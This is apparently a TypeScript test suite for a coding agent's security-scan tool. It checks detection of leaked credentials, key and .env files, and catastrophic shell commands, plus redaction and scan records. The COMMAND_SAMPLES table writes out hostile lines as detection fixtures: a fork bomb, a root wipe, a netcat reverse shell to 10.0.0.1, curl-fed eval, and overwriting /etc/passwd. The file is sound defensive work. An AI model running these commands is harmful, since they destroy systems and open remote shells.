// `security_scan`: the rule set, the redaction, the fingerprint, the record,
// the skip report and D10's tax.
//
// **NO TEST HERE REACHES THE NETWORK, AND NONE CAN.** The tool opens no
// socket and spawns nothing; there is no transport to stub because there is no
// transport.
//
// **NO TEST HERE WRITES OUTSIDE A TEMPORARY DIRECTORY (D11).** Every
// filesystem test runs under `mkdtempSync`, and the store resolves its
// directory from the injected `cwd`, so a scan in a test cannot reach the
// developer's own `.lykos/security/`. The WALK is injected too — a simple
// recursive `readdir` rather than Pi's `find` — so no test shells out to `fd`.
// What that costs is worth saying plainly: the `credential-file.*` rules'
// justification is that the DEFAULT walk (`piWalk`, Pi's `find`) honours
// `.gitignore`, and an injected walk cannot demonstrate that property. What is
// tested here is the matching; the gitignore behaviour belongs to `piWalk` and
// is the reason the default is `piWalk` rather than a hand-rolled walk.
//
// **NO COMPLETE CREDENTIAL LITERAL APPEARS IN THIS FILE.** Every sample key is
// assembled by concatenation at run time, and so is every raw-disk-device
// path. A test file full of key-shaped literals is a file that trips every
// credential scanner it meets — including, if this ticket works, Lykos's own —
// and a scanner's test suite being its own biggest finding is a poor joke to
// leave in a repository.

import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";
import type { ToolDefinition } from "@earendil-works/pi-coding-agent";
import { CRITICAL_COMMAND_PATTERNS } from "../gate/critical-commands.js";
import { SECRET_PATTERNS } from "../loop/hooks.js";
import { TOOL_CATALOG } from "../ledger/tool-catalog.js";
import { measureToolset } from "../ledger/tool-schema.js";
import { riskForTool, tierForTool } from "./tool-risk.js";
import { DEFAULT_RESIDENT_TOOLS, MOUNTED_TOOLS, REGISTRY_OFF_TOOLS } from "./tool-surface.js";
import type { AstWalk } from "./ast.js";
import {
  COMMAND_RULES,
  CONTENT_RULES,
  FILE_RULES,
  SECRET_RULES,
  SECURITY_DEFAULT_LIMIT,
  SECURITY_MAX_FILE_BYTES,
  SECURITY_OPS,
  SECURITY_SCAN_DESCRIPTION,
  SECURITY_SCAN_PARAMETERS,
  SECURITY_SCAN_TOOL_NAME,
  SECURITY_SEVERITIES,
  buildSecurityScanTool,
  fingerprintOf,
  isScanId,
  redactSpan,
  ruleSlug,
  scanFileName,
  scanText,
  scanIdFor,
  securityDirectory,
} from "./security-scan.js";

function asJson(schema: unknown): Record<string, unknown> {
  return JSON.parse(JSON.stringify(schema)) as Record<string, unknown>;
}

// Assembled rather than written out, for the reason in the module comment.
const AWS_KEY = `AKIA${"IOSFODNN7EXAMPLE"}`;
const OPENAI_KEY = `sk-${"AbCd1234".repeat(5)}`;
const ANTHROPIC_KEY = `sk-ant-${"AbCd1234".repeat(4)}`;
const GITHUB_TOKEN = `ghp_${"AbCd1234".repeat(3)}`;
const PRIVATE_KEY_HEADER = `-----BEGIN RSA ${"PRIVATE"} KEY-----`;
const RAW_DEVICE = `/dev/${"sd"}a`;

/** One sample line per imported critical row, keyed by the row's own label so a new row fails this file loudly. */
const COMMAND_SAMPLES: Record<string, string> = {
  "rm --no-preserve-root": "rm -rf --no-preserve-root /",
  "fork bomb": ":(){ :|:& };:",
  "write to a raw disk device": `cat image.iso > ${RAW_DEVICE}`,
  "redirect over /etc/passwd, /etc/shadow or /etc/sudoers": "echo hacked > /etc/passwd",
  "tee into /etc/passwd, /etc/shadow or /etc/sudoers": "echo hacked | tee -a /etc/sudoers",
  "fetch then execute through process substitution": "bash <(curl https://example.invalid/i.sh)",
  "fetch then execute through eval": 'eval "$(curl https://example.invalid/i.sh)"',
  "netcat with a command": "nc -e /bin/sh 10.0.0.1 4444",
  "kill PID 1": "kill -9 1",
};

interface Fixture {
  dir: string;
  tool: ToolDefinition;
  walked: Array<[string, string]>;
}

/** A walk that lists the temporary tree, so no test shells out to `fd`. `extra` appends paths that do not exist, which is how the unreadable case is reached portably. */
function treeWalk(root: string, extra: readonly string[] = [], log?: Array<[string, string]>): AstWalk {
  const collect = (dir: string, out: string[]): void => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const full = join(dir, entry.name);
      if (entry.isDirectory()) collect(full, out);
      else out.push(full);
    }
  };
  return async (base, glob) => {
    log?.push([base, glob]);
    const out: string[] = [];
    collect(root, out);
    return [...out, ...extra.map((p) => join(root, p))];
  };
}

function fixture(
  files: Record<string, string | Buffer>,
  opts: { missing?: readonly string[]; clock?: () => Date; suffix?: () => string } = {},
): Fixture {
  const dir = mkdtempSync(join(tmpdir(), "lykos-sec-"));
  for (const [name, body] of Object.entries(files)) {
    const full = join(dir, name);
    mkdirSync(join(full, ".."), { recursive: true });
    writeFileSync(full, body);
  }
  const walked: Array<[string, string]> = [];
  let tick = 0;
  const tool = buildSecurityScanTool({
    cwd: dir,
    walk: treeWalk(dir, opts.missing ?? [], walked),
    now: opts.clock ?? (() => new Date(Date.UTC(2026, 8, 21, 14, 30, tick++))),
    suffix: opts.suffix ?? (() => "a1b2c3"),
  });
  return { dir, tool, walked };
}

async function call(
  tool: ToolDefinition,
  args: Record<string, unknown>,
): Promise<{ text: string; isError: boolean; details: Record<string, unknown> }> {
  const result = (await tool.execute(
    "call-1",
    args as never,
    undefined as never,
    undefined as never,
    undefined as never,
  )) as { content?: Array<{ text?: string }>; isError?: boolean; details?: unknown };
  return {
    text: result.content?.map((c) => c.text ?? "").join("\n") ?? "",
    isError: result.isError === true,
    details: (result.details ?? {}) as Record<string, unknown>,
  };
}

function recordBytes(dir: string): string {
  const files = readdirSync(securityDirectory(dir));
  return files.map((f) => readFileSync(join(securityDirectory(dir), f), "utf8")).join("\n");
}

// ---------------------------------------------------------------------------
// D10: the catalog prices what security_scan sends, and it is MOUNTED
// ---------------------------------------------------------------------------

describe("P10.8 D10: the catalog prices what security_scan sends", () => {
  it("the row equals the live definition, description and parameters both", () => {
    const row = TOOL_CATALOG.security_scan;
    assert.ok(row);
    assert.equal(row.name, SECURITY_SCAN_TOOL_NAME);
    assert.equal(row.source, "lykos");
    assert.equal(row.description, SECURITY_SCAN_DESCRIPTION);
    assert.deepEqual(row.parameters, asJson(SECURITY_SCAN_PARAMETERS));
  });

  // Measured with `measureToolset` on SCHEMA_TOKENS_BASIS, 2026-09-21. This is
  // a bill that is NOT paid on any request: the tool is mounted with `hidden`
  // presence, so its schema is off the wire entirely. The number is recorded
  // for the day a later ticket makes it resident, and so that a description
  // that doubles the bill fails a test rather than passing silently.
  it("costs 423 tokens alone and moves the mounted set 8601 -> 9023, leaving the resident surface untouched", () => {
    const alone = measureToolset([SECURITY_SCAN_TOOL_NAME]);
    assert.equal(alone.complete, true);
    assert.equal(alone.tokens, 423);
    assert.equal(alone.bytes, 1693);

    const mounted = measureToolset(MOUNTED_TOOLS);
    assert.equal(mounted.complete, true);
    assert.equal(MOUNTED_TOOLS.length, 26);
    assert.equal(mounted.tokens, 9023);
    assert.equal(mounted.bytes, 36175);
    // What the mounted set cost before this ticket, measured the same way, so
    // the move is a subtraction anyone can repeat rather than a recollection.
    assert.equal(
      measureToolset(MOUNTED_TOOLS.filter((n) => n !== SECURITY_SCAN_TOOL_NAME)).tokens,
      8601,
    );

    // The resident surface did not move at all: nothing about this ticket
    // touches the nine schemas that ride every request.
    const resident = measureToolset(DEFAULT_RESIDENT_TOOLS);
    assert.equal(resident.tokens, 2255);
    assert.equal(resident.bytes, 9027);
    assert.equal(DEFAULT_RESIDENT_TOOLS.includes(SECURITY_SCAN_TOOL_NAME), false);
    assert.equal(MOUNTED_TOOLS.includes(SECURITY_SCAN_TOOL_NAME), true);
  });

  // D9: a CORRECTION of the placeholder row, not a redesign. It said `read`
  // and `idempotent: true` for a tool that writes a scan record, and whose
  // second call writes a second one.
  it("is declared soft-write, not idempotent, not open-world, and no longer off", () => {
    assert.equal(tierForTool(SECURITY_SCAN_TOOL_NAME), "soft-write");
    assert.deepEqual(riskForTool(SECURITY_SCAN_TOOL_NAME), {
      tier: "soft-write",
      idempotent: false,
      openWorld: false,
    });
    assert.equal(REGISTRY_OFF_TOOLS.includes(SECURITY_SCAN_TOOL_NAME), false);
  });

  // D9, structurally rather than by assertion on a call: `SecurityScanOpts`
  // has no `gate` member, so there is nothing a gate call could be made
  // through. This test is what proves the tool is usable with nothing but a
  // cwd — the same argument `memory-tools.ts` makes about `acceptProposal`
  // being absent from its dependency object.
  it("needs no gate: the builder takes a cwd and nothing else is required", async () => {
    const dir = mkdtempSync(join(tmpdir(), "lykos-sec-nogate-"));
    try {
      writeFileSync(join(dir, "clean.ts"), "export const x = 1;\n");
      const tool = buildSecurityScanTool({ cwd: dir, walk: treeWalk(dir) });
      const out = await call(tool, {});
      assert.equal(out.isError, false);
      assert.equal(out.details.findings, 0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// D2: the rules are the imported tables, not a second opinion
// ---------------------------------------------------------------------------

describe("P10.8 D2: the rule set is imported, not restated", () => {
  it("there is one rule per imported row, with an id derived from the row's own words", () => {
    assert.equal(SECRET_RULES.length, SECRET_PATTERNS.length);
    assert.equal(COMMAND_RULES.length, CRITICAL_COMMAND_PATTERNS.length);
    assert.equal(CONTENT_RULES.length, SECRET_PATTERNS.length + CRITICAL_COMMAND_PATTERNS.length);
    for (const [index, row] of SECRET_PATTERNS.entries()) {
      const rule = SECRET_RULES[index]!;
      assert.equal(rule.id, `secret.${ruleSlug(row.name)}`);
      assert.equal(rule.pattern, row.pattern, "the rule uses the imported RegExp object itself");
      assert.equal(rule.severity, "critical");
      assert.equal(rule.redact, true);
    }
    for (const [index, row] of CRITICAL_COMMAND_PATTERNS.entries()) {
      const rule = COMMAND_RULES[index]!;
      assert.equal(rule.id, `critical-command.${ruleSlug(row.label)}`);
      assert.equal(rule.pattern, row.pattern);
      assert.equal(rule.severity, "critical");
      // Not redacted: the point of one of these findings is that a human reads
      // the line and sees the fork bomb.
      assert.equal(rule.redact, false);
    }
  });

  it("slugs the words as a rule id, without inventing one", () => {
    assert.equal(ruleSlug("AWS access key id"), "aws-access-key-id");
    assert.equal(ruleSlug("rm --no-preserve-root"), "rm-no-preserve-root");
    assert.equal(ruleSlug("redirect over /etc/passwd, /etc/shadow or /etc/sudoers"), "redirect-over-etc-passwd-etc-shadow-or-etc-sudoers");
  });

  it("has three severities and three ops, and no low tier to hide a weak rule in", () => {
    assert.deepEqual([...SECURITY_SEVERITIES], ["critical", "high", "medium"]);
    assert.deepEqual([...SECURITY_OPS], ["scan", "list", "show"]);
  });
});

describe("P10.8 D2: credentials in a file's contents", () => {
  const cases: Array<[string, string, string]> = [
    ["secret.aws-access-key-id", AWS_KEY, `const key = "${AWS_KEY}";`],
    ["secret.private-key-block", PRIVATE_KEY_HEADER, PRIVATE_KEY_HEADER],
    ["secret.openai-style-key", OPENAI_KEY, `OPENAI_API_KEY=${OPENAI_KEY}`],
    ["secret.anthropic-style-key", ANTHROPIC_KEY, `ANTHROPIC_API_KEY=${ANTHROPIC_KEY}`],
    ["secret.github-token", GITHUB_TOKEN, `token: ${GITHUB_TOKEN}`],
  ];
  for (const [rule, value, line] of cases) {
    it(`finds ${rule} and never repeats the value back`, () => {
      const found = scanText("config.ts", `// nothing here\n${line}\n`);
      const hit = found.find((f) => f.rule === rule);
      assert.ok(hit, `${rule} not found in ${JSON.stringify(found.map((f) => f.rule))}`);
      assert.equal(hit.severity, "critical");
      assert.equal(hit.path, "config.ts");
      assert.equal(hit.line, 2, "1-indexed, because the reader's next call is an edit");
      // D4: the matched span is gone and its length is what took its place.
      assert.equal(hit.excerpt.includes(value), false);
      assert.equal(hit.excerpt.includes(redactSpan(value.length)), true);
    });
  }

  it("collapses the same credential on many lines into one finding and counts the places", () => {
    const found = scanText("config.ts", `a = "${AWS_KEY}"\nb = "${AWS_KEY}"\nc = "${AWS_KEY}"\n`);
    const hits = found.filter((f) => f.rule === "secret.aws-access-key-id");
    assert.equal(hits.length, 1, "one credential to rotate, not three");
    assert.equal(hits[0]!.occurrences, 3);
    assert.equal(hits[0]!.line, 1, "the first place it sits");
  });

  it("finds nothing in ordinary source", () => {
    assert.deepEqual(scanText("ok.ts", "export function add(a: number, b: number) { return a + b; }\n"), []);
  });
});

describe("P10.8 D2: the nine catastrophic shell shapes, in a file's contents", () => {
  it("has a sample for every imported row, so a new row is a failing test rather than a silent gap", () => {
    assert.deepEqual(
      CRITICAL_COMMAND_PATTERNS.map((r) => r.label).sort(),
      Object.keys(COMMAND_SAMPLES).sort(),
    );
  });
  for (const row of CRITICAL_COMMAND_PATTERNS) {
    it(`finds ${row.label}`, () => {
      const line = COMMAND_SAMPLES[row.label]!;
      const found = scanText("scripts/deploy.sh", `#!/bin/sh\nset -e\n${line}\n`);
      const rule = `critical-command.${ruleSlug(row.label)}`;
      const hit = found.find((f) => f.rule === rule);
      assert.ok(hit, `${rule} not found in ${JSON.stringify(found.map((f) => f.rule))}`);
      assert.equal(hit.severity, "critical");
      assert.equal(hit.line, 3);
      assert.equal(hit.title, row.label, "the finding says the shape in the words the table uses");
    });
  }
});

// ---------------------------------------------------------------------------
// D3: classifyCommandRisk is deliberately not run over file contents
// ---------------------------------------------------------------------------

describe("P10.8 D3: the ordinary command classifier does not run over file contents", () => {
  it("says nothing about a build script full of legitimately destructive commands", () => {
    const script = [
      "#!/bin/sh",
      "rm -rf build",
      "rm -rf node_modules/.cache",
      "git push --force-with-lease",
      "sudo apt-get install -y make",
      "curl -sSL https://example.invalid/x.tar.gz | tar xz",
    ].join("\n");
    // Every one of these is `destructive` to `classifyCommandRisk`, correctly,
    // and every one of them is in half the build scripts ever written. A scan
    // that reported them would train its reader to skip the report.
    assert.deepEqual(scanText("scripts/clean.sh", script), []);
  });
});

// ---------------------------------------------------------------------------
// D2: the file-name rules, and the gitignore property they lean on
// ---------------------------------------------------------------------------

describe("P10.8 D2: a credential-bearing file, by name", () => {
  it("has two rules and reports the reason the file's presence is the finding", () => {
    assert.deepEqual(FILE_RULES.map((r) => r.id), [
      "credential-file.private-key",
      "credential-file.environment-file",
    ]);
    for (const rule of FILE_RULES) {
      assert.match(rule.note, /\.gitignore/);
    }
  });

  const keys = ["id_rsa", "id_ed25519", "server.pem", "client.key", "bundle.p12", "store.jks"];
  for (const name of keys) {
    it(`finds a private key or key store called ${name}`, () => {
      const found = scanFileName(`keys/${name}`, name);
      assert.deepEqual(found.map((f) => f.rule), ["credential-file.private-key"]);
      assert.equal(found[0]!.severity, "high");
      assert.equal(found[0]!.line, undefined, "the file is the finding, so there is no line to claim");
    });
  }

  for (const name of [".env", ".env.local", ".env.production"]) {
    it(`finds an environment file called ${name}`, () => {
      const found = scanFileName(name, name);
      assert.deepEqual(found.map((f) => f.rule), ["credential-file.environment-file"]);
      assert.equal(found[0]!.severity, "medium");
    });
  }

  for (const name of [".env.example", ".env.sample", ".env.template", ".env.dist"]) {
    it(`says nothing about the committed template ${name}`, () => {
      assert.deepEqual(scanFileName(name, name), []);
    });
  }

  it("says nothing about ordinary files, including ones whose names mention keys", () => {
    for (const name of ["index.ts", "keys.ts", "environment.md", "README.md", "package.json"]) {
      assert.deepEqual(scanFileName(name, name), [], name);
    }
  });
});

// ---------------------------------------------------------------------------
// D5: the fingerprint identifies the finding, not where it sits
// ---------------------------------------------------------------------------

describe("P10.8 D5: a finding that moved is the same finding", () => {
  it("fingerprints the rule, the path and the matched text — never the line", () => {
    const first = scanText("config.ts", `x = "${AWS_KEY}"\n`);
    const moved = scanText("config.ts", `// a new comment\n// and another\nx = "${AWS_KEY}"\n`);
    assert.equal(first[0]!.line, 1);
    assert.equal(moved[0]!.line, 3);
    assert.equal(first[0]!.fingerprint, moved[0]!.fingerprint);
  });

  it("gives the same rule in a different file a different fingerprint", () => {
    const a = scanText("a.ts", `x = "${AWS_KEY}"\n`);
    const b = scanText("b.ts", `x = "${AWS_KEY}"\n`);
    assert.notEqual(a[0]!.fingerprint, b[0]!.fingerprint);
  });

  it("is insensitive to surrounding whitespace, because indentation is not a finding", () => {
    assert.equal(fingerprintOf("r", "p", " kill -9 1 "), fingerprintOf("r", "p", "kill -9 1"));
  });
});

// ---------------------------------------------------------------------------
// The scan, end to end (D4, D6, D7)
// ---------------------------------------------------------------------------

describe("P10.8: a scan over a scope", () => {
  it("reports findings, writes one record, and hands back an id that already reads", async () => {
    const f = fixture({
      "src/config.ts": `export const key = "${AWS_KEY}";\n`,
      "scripts/wipe.sh": `#!/bin/sh\nrm -rf --no-preserve-root /\n`,
      "src/ok.ts": "export const two = 2;\n",
      ".env": "TOKEN=whatever\n",
    });
    try {
      const out = await call(f.tool, {});
      assert.equal(out.isError, false);
      assert.equal(out.details.filesScanned, 4);
      assert.equal(out.details.findings, 3);
      assert.match(out.text, /\[critical\] secret\.aws-access-key-id {2}src\/config\.ts:1/);
      assert.match(out.text, /\[critical\] critical-command\.rm-no-preserve-root {2}scripts\/wipe\.sh:2/);
      assert.match(out.text, /\[medium\] credential-file\.environment-file {2}\.env/);
      // Highest severity first, then path, then line, so two runs print the
      // same order.
      const order = [...out.text.matchAll(/^\[(\w+)\]/gm)].map((m) => m[1]);
      assert.deepEqual(order, ["critical", "critical", "medium"]);

      const id = out.details.scan as string;
      assert.equal(isScanId(id), true);
      assert.equal(id, scanIdFor(new Date(Date.UTC(2026, 8, 21, 14, 30, 0)), "a1b2c3"));
      assert.match(out.text, new RegExp(`Recorded as ${id}`));
      // Written before the result was rendered, so the id the model is handed
      // is an id something can already read back.
      assert.deepEqual(readdirSync(securityDirectory(f.dir)), [`${id}.json`]);

      const shown = await call(f.tool, { op: "show", scan: id });
      assert.equal(shown.isError, false);
      assert.equal(shown.details.findings, 3);
      assert.match(shown.text, /secret\.aws-access-key-id/);
      // `show` makes no comparison, so it claims none.
      assert.equal(shown.text.includes("new since"), false);
      assert.equal(shown.text.includes("No earlier scan"), false);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  // D4, and it is the property this tool would be worth deleting without.
  it("never writes or prints the credential it found — not in the text, the details or the record", async () => {
    const f = fixture({ "src/config.ts": `export const key = "${AWS_KEY}";\nexport const t = "${GITHUB_TOKEN}";\n` });
    try {
      const out = await call(f.tool, {});
      assert.equal(out.details.findings, 2);
      const details = JSON.stringify(out.details);
      const onDisk = recordBytes(f.dir);
      for (const value of [AWS_KEY, GITHUB_TOKEN]) {
        assert.equal(out.text.includes(value), false, "the credential is in the tool result");
        assert.equal(details.includes(value), false, "the credential is in the details");
        assert.equal(onDisk.includes(value), false, "the credential is in the record on disk");
      }
      // And the finding is still actionable: rule, file, line.
      assert.match(out.text, /secret\.github-token {2}src\/config\.ts:2/);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("says what it skipped, exactly, and never calls a scope it could not read clean", async () => {
    const binary = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x00, 0x01, 0x02]);
    const oversized = Buffer.alloc(SECURITY_MAX_FILE_BYTES + 1, 0x41);
    const f = fixture(
      { "app.png": binary, "huge.txt": oversized, "src/ok.ts": "export const x = 1;\n" },
      { missing: ["vanished.ts"] },
    );
    try {
      const out = await call(f.tool, {});
      assert.equal(out.details.filesScanned, 1);
      assert.equal(out.details.filesSkipped, 3);
      assert.match(out.text, /Not scanned, binary: 1 file — app\.png/);
      assert.match(out.text, /Not scanned, over the \d+-byte file cap: 1 file — huge\.txt/);
      assert.match(out.text, /Not scanned, unreadable: 1 file — vanished\.ts/);
      // "No findings" is never allowed to read as proof.
      assert.match(out.text, /No findings, over 1 file scanned\. This is not proof the code is safe/);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("finds a key file it could not read, because the file's presence is the finding", async () => {
    const f = fixture({ "keys/server.pem": Buffer.alloc(SECURITY_MAX_FILE_BYTES + 1, 0x41) });
    try {
      const out = await call(f.tool, {});
      assert.equal(out.details.filesScanned, 0);
      assert.equal(out.details.findings, 1);
      assert.match(out.text, /credential-file\.private-key {2}keys\/server\.pem/);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("narrows to a path, and the walk is asked for that scope", async () => {
    const f = fixture({
      "src/config.ts": `export const key = "${AWS_KEY}";\n`,
      "other/config.ts": `export const key = "${AWS_KEY}";\n`,
    });
    try {
      await call(f.tool, { path: "src" });
      assert.equal(f.walked.length, 1);
      assert.equal(f.walked[0]![0], join(f.dir, "src"));
      assert.equal(f.walked[0]![1], "**/*");
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("filters by min_severity and caps at limit, saying it capped", async () => {
    const f = fixture({ ".env": "X=1\n", "src/config.ts": `const k = "${AWS_KEY}";\n` });
    try {
      const all = await call(f.tool, {});
      assert.equal(all.details.returned, 2);

      const critical = await call(f.tool, { min_severity: "critical" });
      assert.equal(critical.details.returned, 1);
      assert.equal(critical.text.includes("credential-file.environment-file"), false);

      const capped = await call(f.tool, { limit: 1 });
      assert.equal(capped.details.returned, 1);
      assert.match(capped.text, /Stopped at the 1-finding limit/);
      // The record keeps everything the limit cut.
      assert.equal(capped.details.findings, 2);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("defaults limit to the documented number", () => {
    assert.equal(SECURITY_DEFAULT_LIMIT, 50);
  });
});

// ---------------------------------------------------------------------------
// D5: what is new since the last scan of this scope
// ---------------------------------------------------------------------------

describe("P10.8 D5: a repeat scan says what is new", () => {
  it("marks nothing new on an unchanged scope, and exactly the added credential on a changed one", async () => {
    const f = fixture({ "src/config.ts": `export const key = "${AWS_KEY}";\n` });
    try {
      const first = await call(f.tool, {});
      assert.equal(first.details.comparedWith, null);
      assert.match(first.text, /No earlier scan of this scope/);
      assert.equal(first.details.newFindings, 1, "with no baseline, every finding is new");

      const second = await call(f.tool, {});
      assert.equal(second.details.comparedWith, first.details.scan);
      assert.equal(second.details.newFindings, 0);
      assert.match(second.text, /Nothing new since scan-/);
      assert.match(second.text, /\(carried over\)/);

      writeFileSync(join(f.dir, "src", "config.ts"), `// moved down\nexport const key = "${AWS_KEY}";\nexport const t = "${GITHUB_TOKEN}";\n`);
      const third = await call(f.tool, {});
      assert.equal(third.details.comparedWith, second.details.scan);
      // The AWS key moved from line 1 to line 2 and is NOT new; the token is.
      assert.equal(third.details.newFindings, 1);
      assert.match(third.text, /1 of these is new since scan-/);
      assert.match(third.text, /secret\.github-token {2}src\/config\.ts:3 {2}\(new\)/);
      assert.match(third.text, /secret\.aws-access-key-id {2}src\/config\.ts:2 {2}\(carried over\)/);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("compares against the last scan of THIS scope, not of another one", async () => {
    const f = fixture({ "src/config.ts": `const k = "${AWS_KEY}";\n`, "other/x.ts": "export const x = 1;\n" });
    try {
      await call(f.tool, { path: "src" });
      const other = await call(f.tool, { path: "other" });
      assert.equal(other.details.comparedWith, null, "a different scope has no baseline of its own yet");
      const again = await call(f.tool, { path: "src" });
      assert.equal(typeof again.details.comparedWith, "string");
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// D6 and D8: list, show, and the refusals
// ---------------------------------------------------------------------------

describe("P10.8 D6: the records are read back, and nothing is pruned", () => {
  it("lists nothing before a scan, then every scan newest first", async () => {
    let tick = 0;
    const f = fixture(
      { "src/config.ts": `const k = "${AWS_KEY}";\n` },
      {
        clock: () => new Date(Date.UTC(2026, 8, 21, 14, 30, tick)),
        suffix: () => `00000${tick++}`,
      },
    );
    try {
      const empty = await call(f.tool, { op: "list" });
      assert.equal(empty.details.scans, 0);
      assert.match(empty.text, /No scans recorded for this project/);

      const first = await call(f.tool, {});
      const second = await call(f.tool, {});
      const listed = await call(f.tool, { op: "list" });
      assert.equal(listed.details.scans, 2);
      assert.deepEqual(listed.details.ids, [second.details.scan, first.details.scan]);
      assert.match(listed.text, /Nothing here is ever pruned/);
      // Both records are still on disk: a second scan adds, it never replaces.
      assert.equal(readdirSync(securityDirectory(f.dir)).length, 2);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("reports an unknown scan id rather than throwing, and refuses one shaped like a path", async () => {
    const f = fixture({ "src/ok.ts": "export const x = 1;\n" });
    try {
      const missing = await call(f.tool, { op: "show", scan: "scan-20260921T143000Z-ffffff" });
      assert.equal(missing.isError, true);
      assert.equal(missing.details.status, "not_found");

      // A scan id is a file name, so a name that can contain a separator is a
      // traversal waiting to be written down. It never reaches a path.
      for (const bad of ["../../etc/passwd", "scan-../../x", "scan-a/b-1"]) {
        const out = await call(f.tool, { op: "show", scan: bad });
        assert.equal(out.isError, true, bad);
        assert.equal(out.details.status, "not_found", bad);
      }
      assert.equal(isScanId("../../etc/passwd"), false);
      assert.equal(isScanId("scan-20260921T143000Z-a1b2c3"), true);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });

  it("refuses an unknown op and an unknown severity by naming what exists", async () => {
    const f = fixture({ "src/ok.ts": "export const x = 1;\n" });
    try {
      await assert.rejects(() => call(f.tool, { op: "preflight" }), /unknown op "preflight".*scan, list, show/s);
      await assert.rejects(() => call(f.tool, { min_severity: "informational" }), /unknown min_severity/);
      await assert.rejects(() => call(f.tool, { op: "show" }), /show needs `scan`/);
    } finally {
      rmSync(f.dir, { recursive: true, force: true });
    }
  });
});
